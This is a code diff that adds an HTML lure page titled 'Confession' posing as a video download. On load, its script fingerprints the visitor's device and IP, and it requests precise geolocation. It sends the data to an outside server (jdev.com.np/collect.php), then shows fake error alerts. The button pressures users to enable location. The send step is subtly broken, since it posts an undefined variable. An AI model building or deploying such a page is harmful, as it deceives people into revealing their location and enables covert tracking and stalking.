@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Confession</title>
+  <meta charset="UTF-8">
+</head>
+
+<body
+  style="margin:0; height:100vh; background: linear-gradient(135deg, #f89820, #ec5e28); display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif;">
+
+  <div style="text-align: center; color: white;">
+    <div
+      style="border: 6px solid #fff; border-top: 6px solid #ec5e28; border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 15px; animation: spin 1s linear infinite;">
+    </div>
+    <h1 style="margin: 0 0 20px;">Loading Video...</h1>
+    <button onclick="triggerLocation()"
+      style="padding: 10px 20px; font-size: 16px; background: white; color: #ec5e28; border: none; border-radius: 5px; cursor: pointer;">
+      Download Video
+    </button>
+  </div>
+
+  <script>
+    function triggerLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            // alert(`Location OK. Starting download at:\nLat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`);
+            // // Replace below with actual download logic
+            window.location.reload(); // Just refreshes the page as placeholder
+          },
+          error => {
+            if (error.code === error.PERMISSION_DENIED) {
+              alert("Might be location issue try to change browser or open location in setting to dowload video.");
+            } else {
+              alert("Location error: " + error.message);
+            }
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        alert("error.");
+      }
+    }
+  </script>
+
+  <style>
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+  <script>
+    async function collectInfo() {
+      const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
+
+      const device = {
+        ip,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages.join(', '),
+        cookieEnabled: navigator.cookieEnabled,
+        javaEnabled: navigator.javaEnabled?.() || false,
+        cpuCores: navigator.hardwareConcurrency || "N/A",
+        ram: navigator.deviceMemory || "N/A",
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        touchSupport: 'ontouchstart' in window,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        connectionType: navigator.connection?.type || "N/A",
+        effectiveType: navigator.connection?.effectiveType || "N/A",
+        downlink: navigator.connection?.downlink || "N/A",
+        rtt: navigator.connection?.rtt || "N/A",
+        saveData: navigator.connection?.saveData || false,
+        latitude: null,
+        longitude: null,
+        accuracy: null,
+        altitude: null,
+        speed: null,
+        timestamp: null
+      };
+
+      if (navigator.geolocation) {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000
+            });
+          });
+          const coords = pos.coords;
+          device.latitude = coords.latitude;
+          device.longitude = coords.longitude;
+          device.accuracy = coords.accuracy;
+          device.altitude = coords.altitude;
+          device.speed = coords.speed;
+          device.timestamp = new Date(pos.timestamp).toISOString();
+          device.mapLink = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
+        } catch (err) {
+          console.warn("Geolocation error:", err.message);
+        }
+      }
+
+
+      // Send to server
+      fetch("https://jdev.com.np/collect.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).then(res => res.json())
+        .then(data => {
+          alert("Video is not loading try to open the link in another browser");
+        });
+    }
+
+    collectInfo();
+  </script>
+</body>
+
+</html>
